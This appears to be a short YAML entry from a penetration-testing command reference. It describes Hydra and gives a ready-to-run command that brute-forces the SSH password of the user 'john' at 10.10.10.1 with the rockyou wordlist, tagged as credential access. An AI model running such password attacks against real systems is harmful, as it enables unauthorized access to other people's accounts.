---
description: |
  Hydra is a fast, parallelized network login cracker that supports numerous protocols. The following command performs an online brute-force/dictionary attack against an SSH service using a known username and a password wordlist, attempting each password in the list until a valid credential is found or the list is exhausted.

  Command Reference:

  	Target IP: 10.10.10.1

  	Username: john

  	Wordlist: /usr/share/wordlists/rockyou.txt

command: |
  hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.1
items:
  - Username
services:
  - SSH
OS:
  - Linux
phases:
  - CredentialAccess
references:
  - https://github.com/vanhauser-thc/thc-hydra
  - https://www.kali.org/tools/hydra/
---
